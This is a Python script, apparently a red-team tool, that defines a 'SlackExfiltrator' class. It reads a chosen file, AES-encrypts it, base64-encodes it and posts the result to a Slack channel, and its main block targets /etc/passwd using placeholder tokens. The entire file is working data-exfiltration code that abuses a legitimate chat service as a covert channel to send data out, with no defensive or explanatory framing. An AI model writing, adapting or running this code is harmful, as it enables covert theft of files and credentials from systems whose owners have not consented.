#!/usr/bin/python

import os
import sys
import base64
import hashlib

from Crypto import Random
from Crypto.Cipher import AES
from slackclient import SlackClient

# CONSTANTS
POST_MESSAGE = "chat.postMessage"


def md5(fname):
    hash_md5 = hashlib.md5()
    with open(fname, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

class AESCipher(object):

    def __init__(self, key):
        self.bs = 32
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(raw)

    def decrypt(self, enc):
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]


class SlackExfiltrator():
    def __init__(self, slackID, slackToken, encKey):
        self.slackID = slackID
        self.slackToken = slackToken
        self.encKey = encKey

        self.encDriver = AESCipher(key=self.encKey)
        self.slackObj = None

    def _getFileContent(self, file_path):
        try:
            f = open(file_path, 'rb')
            data = f.read()
            f.close()
            sys.stdout.write("[+]\tFile '%s' was loaded for exfiltration.\n" % file_path)
            return data
        except IOError, e:
            sys.stderr.write("[-]\tUnable to read file '%s'.\n%s.\n" % (file_path, e))
            return 1

    def _connect2Slack(self):
        self.slackObj = SlackClient(self.slackToken)

        if self.slackObj.api_call("api.test")['ok'] == True:
            sys.stdout.write("[+]\tConnected to Slack. API is valid!\n")
            return True

        else:
            sys.stderr.write("Unable to connect to slack. Maybe token is wrong?\n")
            sys.stderr.write("%s\n" % self.slackObj.api_call("api.test")['error'])
            sys.exit(1)

    def ExfiltrateFile(self, file_path):
        cont = self._getFileContent(file_path)
        md5_sum = md5(file_path)
        encData = self.encDriver.encrypt(cont)
        bdata = base64.b64encode(encData)
        self.slackObj.api_call(POST_MESSAGE, channel=self.slackID, as_user=False, text=bdata)
        return True


if __name__ == "__main__":
    slackExf = SlackExfiltrator(slackID="11111FD", slackToken="xoxo-abc", encKey="Abc!23")
    slackExf._connect2Slack()
    slackExf.ExfiltrateFile(file_path="/etc/passwd")
